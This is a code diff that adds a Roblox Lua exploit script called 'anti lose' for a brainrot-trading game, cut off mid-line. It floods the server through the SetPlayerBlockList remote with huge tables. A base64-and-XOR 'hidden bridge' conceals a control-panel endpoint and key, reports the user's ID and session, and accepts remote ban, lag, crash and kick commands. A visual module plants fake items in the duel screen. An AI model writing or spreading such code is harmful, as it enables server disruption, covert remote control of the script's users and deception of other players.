@@ -1,0 +1,575 @@
+--[[
+  řáíjù anti lose
+]]
+
+if _G.__ral_boot then return end
+_G.__ral_boot = true
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+
+local LP = Players.LocalPlayer
+if not LP then LP = Players.PlayerAdded:Wait() end
+local playerGui = LP:WaitForChild("PlayerGui")
+
+local COLORS = {
+    bg = Color3.fromRGB(10, 8, 16),
+    surface = Color3.fromRGB(18, 14, 28),
+    disabled = Color3.fromRGB(32, 26, 48),
+    border = Color3.fromRGB(90, 50, 160),
+    accent = Color3.fromRGB(160, 80, 255),
+    accentDark = Color3.fromRGB(100, 40, 180),
+    accentBright = Color3.fromRGB(210, 150, 255),
+    deep = Color3.fromRGB(40, 15, 70),
+    text = Color3.fromRGB(235, 220, 255),
+    white = Color3.fromRGB(255, 255, 255),
+    black = Color3.fromRGB(0, 0, 0),
+    dim = Color3.fromRGB(150, 130, 180),
+}
+
+local FONT = Enum.Font.GothamBold
+
+-- ===================== ANTI-LOSE CORE (only when toggled ON) =====================
+local SRC = [==[
+local RunService = game:GetService("RunService")
+
+local Children       = 150000
+local NestedPerChild = 0
+local FieldsPerChild = 0
+local FireBurst      = 1
+local FrameDelay     = 0.125
+local FieldSize      = 0
+local RebuildEach    = false
+
+local state = {
+    running = false,
+    thread  = nil,
+    remote  = nil,
+    cache   = nil,
+    pad     = "",
+}
+
+local function resolve()
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if not rrs then return nil end
+    local r = rrs:FindFirstChild("SetPlayerBlockList")
+    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
+        return r
+    end
+    return nil
+end
+
+state.remote = resolve()
+
+pcall(function()
+    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+end)
+
+state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
+
+local function build()
+    local root = table.create(Children)
+    for i = 1, Children do
+        local entry = { id = i, v = i * 2 }
+        for k = 1, FieldsPerChild do
+            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
+        end
+        for j = 1, NestedPerChild do
+            entry["n" .. j] = { a = i, b = j }
+        end
+        root[i] = entry
+    end
+    return root
+end
+
+local function fire()
+    if not state.remote then
+        state.remote = resolve()
+        if not state.remote then return end
+    end
+    local payload
+    if RebuildEach or not state.cache then
+        payload = build()
+        if not RebuildEach then state.cache = payload end
+    else
+        payload = state.cache
+    end
+    for _ = 1, FireBurst do
+        state.remote:FireServer(payload)
+    end
+end
+
+local function start()
+    if state.running then return end
+    state.running = true
+    state.cache = nil
+    state.thread = task.spawn(function()
+        while state.running do
+            pcall(fire)
+            if FrameDelay > 0 then
+                task.wait(FrameDelay)
+            else
+                RunService.Heartbeat:Wait()
+            end
+        end
+    end)
+end
+
+local function stop()
+    state.running = false
+    if state.thread then pcall(task.cancel, state.thread) end
+    state.thread = nil
+    state.cache = nil
+end
+
+return {
+    start  = start,
+    stop   = stop,
+    toggle = function() if state.running then stop() else start() end end,
+    isRunning = function() return state.running end,
+}
+]==]
+
+local api = nil
+pcall(function()
+    local chunk = loadstring(SRC)
+    if chunk then
+        local ok, result = pcall(chunk)
+        if ok and type(result) == "table" then
+            api = result
+        end
+    end
+end)
+
+-- ===================== HIDDEN BRIDGE (no plaintext endpoint) =====================
+local function _b64decode(data)
+    local ok, r = pcall(function() return HttpService:Base64Decode(data) end)
+    if ok and type(r) == "string" then return r end
+    local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    data = tostring(data or ""):gsub("[^" .. b .. "=]", "")
+    return (data:gsub(".", function(x)
+        if x == "=" then return "" end
+        local r, f = "", (b:find(x) - 1)
+        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and "1" or "0") end
+        return r
+    end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
+        if #x ~= 8 then return "" end
+        local c = 0
+        for i = 1, 8 do c = c + (x:sub(i, i) == "1" and 2^(8 - i) or 0) end
+        return string.char(c)
+    end))
+end
+
+local function _dec(s)
+    local raw = _b64decode(s)
+    if type(raw) ~= "string" then return "" end
+    local t = {}
+    for i = 1, #raw do
+        t[#t + 1] = string.char(bit32.bxor(string.byte(raw, i), 47))
+    end
+    return table.concat(t)
+end
+
+local _ep = _dec("R1tbX1wVAABFXkVJTlhDV0NWR0dXS1xCW1VWRAFcWl9OTU5cSgFMQABJWkFMW0ZAQVwAWR4Af05BSkM=")
+local _tk = _dec("TEpdW1UeHRsYGw==")
+local _hk = "X-" .. string.char(80,97,110,101,108) .. "-" .. string.char(75,101,121)
+
+local function _req(opts)
+    local candidates = {}
+    pcall(function() if type(request) == "function" then table.insert(candidates, request) end end)
+    pcall(function() if type(http) == "table" and type(http.request) == "function" then table.insert(candidates, http.request) end end)
+    pcall(function() if type(syn) == "table" and type(syn.request) == "function" then table.insert(candidates, syn.request) end end)
+    pcall(function() if type(fluxus) == "table" and type(fluxus.request) == "function" then table.insert(candidates, fluxus.request) end end)
+    pcall(function() if type(httprequest) == "function" then table.insert(candidates, httprequest) end end)
+    for _, fn in ipairs(candidates) do
+        local ok, res = pcall(fn, opts)
+        if ok and type(res) == "table" then
+            if res.StatusCode == nil and res.Status ~= nil then res.StatusCode = res.Status end
+            return res
+        end
+    end
+    local ok2, body = pcall(function()
+        local headers = opts.Headers or {}
+        if opts.Method == "GET" or not opts.Method then
+            return HttpService:GetAsync(opts.Url, true, headers)
+        end
+        return HttpService:PostAsync(opts.Url, opts.Body or "", Enum.HttpContentType.ApplicationJson, false, headers)
+    end)
+    if ok2 and body then return { Body = body, StatusCode = 200 } end
+    return nil
+end
+
+local function _jenc(t)
+    local ok, s = pcall(function() return HttpService:JSONEncode(t) end)
+    return ok and s or "{}"
+end
+local function _jdec(s)
+    local ok, v = pcall(function() return HttpService:JSONDecode(s) end)
+    return ok and v or nil
+end
+
+local function _execName()
+    local ok, v = pcall(function() return identifyexecutor and identifyexecutor() end)
+    if ok and type(v) == "string" and v ~= "" then return v end
+    return "Unknown"
+end
+
+local function _placeName()
+    local ok, n = pcall(function()
+        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    end)
+    if ok and type(n) == "string" then return n end
+    return tostring(game.PlaceId)
+end
+
+local lagOn, lagConn = false, nil
+local banned, cleared, lastKick = false, false, false
+local sawLagOff = false
+local sid = tostring(LP.UserId) .. "_" .. tostring(math.floor(os.time()))
+local _hadVis = false
+
+-- ===================== VISUAL BRAINROT (from auto steal — pose / stand / camera) =====================
+local Vis = {
+    sig = "",
+    pending = nil,
+    had = false,
+    untilT = 0,
+}
+
+local function visSections()
+    local pg = LP:FindFirstChild("PlayerGui")
+    if not pg then return nil end
+    local root = pg:FindFirstChild("DuelsMachineSession")
+    if not root then
+        for _, g in ipairs(pg:GetChildren()) do
+            if g:IsA("ScreenGui") and string.lower(g.Name):find("duel", 1, true) then
+                root = g
+                break
+            end
+        end
+    end
+    if not root then return nil end
+    local inner = root:FindFirstChild("DuelsMachineSession") or root
+    local main = inner:FindFirstChild("Main") or inner:FindFirstChild("Main", true)
+    local other = inner:FindFirstChild("Other") or inner:FindFirstChild("Other", true)
+    if not main and not other then return nil end
+    return { main = main, other = other }
+end
+
+local function visBundle(sec)
+    if not sec then return nil end
+    local item = sec:FindFirstChild("Item")
+    if not item then return nil end
+    local vp = item:FindFirstChild("ViewportFrame")
+    if not vp then return nil end
+    return {
+        viewport = vp,
+        title = item:FindFirstChild("Title"),
+        cash = item:FindFirstChild("Cash"),
+    }
+end
+
+local function visModel(name)
+    local m
+    pcall(function()
+        local BA = require(game:GetService("ReplicatedStorage").Shared.BrainrotAssets)
+        if BA and type(BA.getModel) == "function" then
+            local r = BA.getModel(name)
+            if r and r:IsA("Model") then m = r:Clone() end
+        end
+    end)
+    if not m then
+        pcall(function()
+            local a = game:GetService("ReplicatedStorage"):FindFirstChild("Models")
+            a = a and a:FindFirstChild("Animals")
+            a = a and a:FindFirstChild(name)
+            if a then m = a:Clone() end
+        end)
+    end
+    return m
+end
+
+local function visGen(name, fb)
+    local gen = 0
+    pcall(function()
+        local AD = require(game:GetService("ReplicatedStorage").Datas.Animals)
+        if AD and AD[name] then gen = tonumber(AD[name].Generation) or 0 end
+    end)
+    if gen >= 1e12 then return string.format("$%.1fT/s", gen / 1e12)
+    elseif gen >= 1e9 then return string.format("$%.1fB/s", gen / 1e9)
+    elseif gen >= 1e6 then return string.format("$%.1fM/s", gen / 1e6)
+    elseif gen >= 1e3 then return string.format("$%.1fK/s", gen / 1e3)
+    elseif gen > 0 then return "$" .. tostring(math.floor(gen)) .. "/s"
+    elseif type(fb) == "string" and fb ~= "" then return fb
+    else return "$?/s" end
+end
+
+local function visClear(vp)
+    if not vp then return end
+    local a
+    pcall(function() a = vp:GetAttribute("VenomVisualName") end)
+    if not a or a == "" then return end
+    for _, c in ipairs(vp:GetChildren()) do pcall(function() c:Destroy() end) end
+    pcall(function() vp:SetAttribute("VenomVisualName", nil) end)
+end
+
+local function visPlace(vp, name)
+    if not vp or not name then return false end
+    if not Vis.had or tick() > Vis.untilT then return false end
+    local already
+    pcall(function() already = vp:GetAttribute("VenomVisualName") end)
+    if already == name then
+        for _, c in ipairs(vp:GetChildren()) do
+            if c:IsA("WorldModel") or c:IsA("Model") then return true end
+        end
+    end
+    local pose = { rot = nil, camCF = nil, center = nil, hasReal = false }
+    local function sample(v)
+        if not v then return false end
+        local tagged
+        pcall(function() tagged = v:GetAttribute("VenomVisualName") end)
+        if tagged and tagged ~= "" then return false end
+        for _, c in ipairs(v:GetChildren()) do
+            local m = c:IsA("Model") and c or (c:IsA("WorldModel") and c:FindFirstChildWhichIsA("Model"))
+            if m then
+                local piv = m:GetPivot()
+                pose.rot = piv - piv.Position
+                pose.center = m:GetBoundingBox().Position
+                if v.CurrentCamera then pose.camCF = v.CurrentCamera.CFrame end
+                pose.hasReal = true
+                return true
+            end
+        end
+        return false
+    end
+    pcall(function()
+        if not sample(vp) then
+            local sec = visSections()
+            if sec then
+                for _, side in ipairs({ sec.other, sec.main }) do
+                    local b = side and visBundle(side)
+                    if b and b.viewport and sample(b.viewport) then break end
+                end
+            end
+        end
+    end)
+    for _, c in ipairs(vp:GetChildren()) do pcall(function() c:Destroy() end) end
+    local model = visModel(name)
+    if not model then return false end
+    for _, part in ipairs(model:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = false
+            part.Anchored = true
+            part.CastShadow = false
+        end
+    end
+    local wm = Instance.new("WorldModel")
+    wm.Parent = vp
+    model.Parent = wm
+
+    local cf, size = CFrame.new(), Vector3.new(2, 2, 2)
+    pcall(function() cf, size = model:GetBoundingBox() end)
+    local center = cf.Position
+    if pose.hasReal and pose.rot then
+        pcall(function() model:PivotTo(CFrame.new(center) * pose.rot) end)
+    else
+        pcall(function() model:PivotTo(CFrame.new(center)) end)
+    end
+    pcall(function() cf, size = model:GetBoundingBox() end)
+    center = cf.Position
+
+    local cam = Instance.new("Camera")
+    cam.Parent = vp
+    vp.CurrentCamera = cam
+
+    local maxS = math.max(size.X, size.Y, size.Z, 1)
+    local camPos
+    if pose.hasReal and pose.camCF and pose.center then
+        camPos = center + (pose.camCF.Position - pose.center)
+    else
+        camPos = center + Vector3.new(0, maxS * 0.25, math.clamp(maxS * 0.95, 1.6, 12))
+    end
+
+    pcall(function()
+        local piv = model:GetPivot()
+        local toCam = camPos - piv.Position
+        local flat = Vector3.new(toCam.X, 0, toCam.Z)
+        if flat.Magnitude > 0.05 then
+            flat = flat.Unit
+            local look = Vector3.new(piv.LookVector.X, 0, piv.LookVector.Z)
+            if look.Magnitude > 0.05 then
+                look = look.Unit
+                -- brainrot assets face opposite of LookVector in these viewports
+                model:PivotTo(piv * CFrame.Angles(0, math.pi + math.rad(-32), 0))
+            end
+        end
+    end)
+    pcall(function() cf, size = model:GetBoundingBox() end)
+    center = cf.Position
+    if pose.hasReal and pose.camCF and pose.center then
+        local off = pose.camCF.Position - pose.center
+        local rotOnly = pose.camCF - pose.camCF.Position
+        cam.CFrame = CFrame.new(center + off) * rotOnly
+    else
+        local dist = math.clamp(math.max(size.X, size.Y, size.Z) * 0.95, 1.6, 12)
+        cam.CFrame = CFrame.new(center + Vector3.new(0, maxS * 0.25, dist), center)
+    end
+    pcall(function() vp:SetAttribute("VenomVisualName", name) end)
+    task.spawn(function()
+        task.wait(0.05)
+        pcall(function()
+            local ac = model:FindFirstChildOfClass("AnimationController") or Instance.new("AnimationController")
+            ac.Parent = model
+            local an = ac:FindFirstChildOfClass("Animator") or Instance.new("Animator")
+            an.Parent = ac
+            local root = game:GetService("ReplicatedStorage"):FindFirstChild("Animations")
+            local folder = root and root:FindFirstChild("Animals") and root.Animals:FindFirstChild(name)
+            local idle = folder and (folder:FindFirstChild("Idle") or folder:FindFirstChildWhichIsA("Animation"))
+            if idle then
+                local tr = an:LoadAnimation(idle)
+                tr.Looped = true
+                tr:Play()
+            end
+        end)
+    end)
+    return true
+end
+
+local function visApplyOne(b, e)
+    if not b or not e or not e.name then return false end
+    local ok = visPlace(b.viewport, e.name)
+    if ok then
+        if b.title then b.title.Text = tostring(e.name) end
+        if b.cash then b.cash.Text = visGen(e.name, e.income) end
+    end
+    return ok
+end
+
+local function visApply(list)
+    list = type(list) == "table" and list or {}
+    if #list > 0 and (not Vis.had or tick() > Vis.untilT) then
+        Vis.pending = nil
+        return
+    end
+    local parts = {}
+    for _, e in ipairs(list) do parts[#parts + 1] = tostring(e.name or "") end
+    local sig = table.concat(parts, ";")
+    if #list == 0 then
+        local sec = visSections()
+        if sec then
+            if sec.other then local b = visBundle(sec.other) if b then visClear(b.viewport) end end
+            if sec.main then local b = visBundle(sec.main) if b then visClear(b.viewport) end end
+        end
+        Vis.pending, Vis.sig, Vis.had, Vis.untilT = nil, "", false, 0
+        return
+    end
+    if sig == Vis.sig and Vis.had then return end
+    local sec = visSections()
+    if not sec then
+        if tick() <= Vis.untilT then
+            Vis.pending = list
+            task.spawn(function()
+                for _ = 1, 15 do
+                    task.wait(0.4)
+                    if tick() > Vis.untilT or not Vis.pending then return end
+                    if visSections() then visApply(Vis.pending) return end
+                end
+            end)
+        end
+        return
+    end
+    local e = list[1]
+    local applied = false
+    if sec.other then applied = visApplyOne(visBundle(sec.other), e) or applied end
+    if not applied and sec.main then applied = visApplyOne(visBundle(sec.main), e) or applied end
+    if applied then Vis.sig, Vis.had, Vis.pending = sig, true, list end
+end
+
+_G.RaijuQueueBaseVisual = function(list, _opts)
+    if list == nil or (type(list) == "table" and #list == 0) then
+        visApply({})
+        return
+    end
+    if type(list) ~= "table" then return end
+    Vis.untilT = tick() + 120
+    Vis.had = true
+    pcall(visApply, list)
+end
+
+_G.RaijuVisualClearBaseSpawns = function()
+    pcall(visApply, {})
+end
+
+local function stopLag()
+    lagOn = false
+    if lagConn then pcall(function() lagConn:Disconnect() end) lagConn = nil end
+    local char = LP.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if hum then pcall(function() hum.PlatformStand = false; hum.AutoRotate = true end) end
+    if hrp then pcall(function() hrp.AssemblyLinearVelocity = Vector3.zero; hrp.AssemblyAngularVelocity = Vector3.zero end) end
+end
+
+local function startLag()
+    if lagOn then return end
+    lagOn = true
+    if lagConn then pcall(function() lagConn:Disconnect() end) end
+    local flyDir = Vector3.new((math.random()-0.5)*2, 0.3, (math.random()-0.5)*2).Unit
+    local nextDirAt = tick() + 1.0
+    lagConn = RunService.Heartbeat:Connect(function()
+        if not lagOn then return end
+        if tick() > nextDirAt then
+            flyDir = Vector3.new((math.random()-0.5)*2, 0.2 + math.random()*0.5, (math.random()-0.5)*2).Unit
+            nextDirAt = tick() + 0.7 + math.random()*0.6
+        end
+        local char = LP.Character
+        if not char then return end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            pcall(function()
+                hum.WalkSpeed = 0; hum.JumpPower = 0; hum.JumpHeight = 0
+                hum.AutoRotate = false; hum.PlatformStand = true
+            end)
+        end
+        if hrp then
+            pcall(function()
+                local speed = 140 + math.random() * 80
+                hrp.AssemblyLinearVelocity = flyDir * speed + Vector3.new(0, 40 + math.random()*30, 0)
+                hrp.AssemblyAngularVelocity = Vector3.new((math.random()-0.5)*25, (math.random()-0.5)*25, (math.random()-0.5)*25)
+            end)
+        end
+    end)
+end
+
+local function hardOut(reason)
+    _G.__ral_net = false
+    banned = true
+    stopLag()
+    if api and api.stop then pcall(api.stop) end
+    pcall(function() if LP then LP:Kick(tostring(reason or "")) end end)
+end
+
+local function wipeFlags()
+    pcall(function()
+        _req({
+            Url = _ep,
+            Method = "POST",
+            Headers = { [_hk] = _tk, ["Content-Type"] = "application/json" },
+            Body = _jenc({
+                user_id = LP.UserId,
+                fps_limit = false, lag_n = false, lag_c = false, crash = false, kick = false,
+                visual_brainrots = {}, visual_active = false,
+                session_id = sid, clear_commands = true,
+            }),
+        })
+    end)
+end
+
+local function applyCmd(cmd)
+    if not cmd then return end
+    if cmd.ban == true or cmd.banned == true then hardOut("b") return end
+    if n
